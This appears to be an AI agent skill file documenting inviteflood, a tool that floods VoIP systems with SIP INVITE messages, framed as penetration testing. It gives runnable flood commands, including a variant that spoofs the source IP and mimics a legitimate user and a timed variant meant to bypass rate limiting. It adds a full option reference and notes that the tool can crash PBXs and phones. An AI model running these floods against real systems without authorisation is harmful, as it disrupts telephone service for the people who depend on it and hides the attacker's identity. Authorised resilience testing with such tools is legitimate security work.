---
name: inviteflood
description: Perform SIP/SDP INVITE message flooding over UDP/IP to test the resilience of VoIP infrastructure. Use when performing vulnerability analysis, stress testing SIP proxies/gateways, or executing denial-of-service (DoS) simulations against VoIP targets during penetration testing.
---

# inviteflood

## Overview
A specialized tool designed to flood SIP/SDP INVITE messages over UDP/IP. It is primarily used to evaluate the stability of VoIP systems and user agents under high-volume call signaling stress. Category: Vulnerability Analysis / Sniffing & Spoofing (VoIP).

## Installation (if not already installed)
Assume inviteflood is already installed. If the command is missing:

```bash
sudo apt install inviteflood
```

## Common Workflows

### Basic Flood Attack
Flood a specific extension on a target SIP server with 1000 packets using the default interface:
```bash
inviteflood eth0 5000 192.168.1.5 192.168.1.5 1000
```

### Stealthy/Spoofed Flood
Flood a target while spoofing the source IP and using a specific "From" alias to mimic a legitimate user:
```bash
inviteflood eth0 5000 enterprise.com 192.168.1.5 5000 -a jane.doe -i 192.168.1.100
```

### High-Intensity Controlled Flood
Flood with a specific delay (in microseconds) between packets to bypass simple rate-limiting or to find the exact breaking point:
```bash
inviteflood eth0 5000 192.168.1.5 192.168.1.5 10000 -s 500 -D 5060
```

## Complete Command Reference

```bash
inviteflood <interface> <target_user> <target_domain> <target_ip> <packet_count> [options]
```

### Mandatory Arguments

| Argument | Description |
|----------|-------------|
| `interface` | Network interface to use (e.g., `eth0`, `wlan0`) |
| `target user` | The SIP user/extension to target (e.g., `""`, `john.doe`, `5000`, or `"1+210-555-1212"`) |
| `target domain` | The SIP domain (e.g., `enterprise.com` or an IPv4 address) |
| `target_ip` | The destination IPv4 address of the flood target (`ddd.ddd.ddd.ddd`) |
| `packet_count` | Flood stage (total number of INVITE packets to send) |

### Optional Flags

| Flag | Description |
|------|-------------|
| `-a <alias>` | Flood tool "From:" alias (e.g., `jane.doe`) |
| `-i <ip>` | IPv4 source IP address [default: IP address of the interface] |
| `-S <port>` | Source Port (0 - 65535) [default: 9 - well-known discard port] |
| `-D <port>` | Destination Port (0 - 65535) [default: 5060 - well-known SIP port] |
| `-l <string>` | Line string used by SNOM phones [default: blank] |
| `-s <usec>` | Sleep time between INVITE messages in microseconds |
| `-h` | Print help and usage information |
| `-v` | Enable verbose output mode |

## Notes
- **Impact**: This tool can easily crash poorly configured VoIP PBXs or SIP phones. Use with caution in production environments.
- **Permissions**: Requires root privileges to craft and send raw UDP packets via the network interface.
- **Timing**: The `-s` (sleep) flag is critical for fine-tuning the attack; without it, the tool sends packets as fast as the CPU/NIC allows.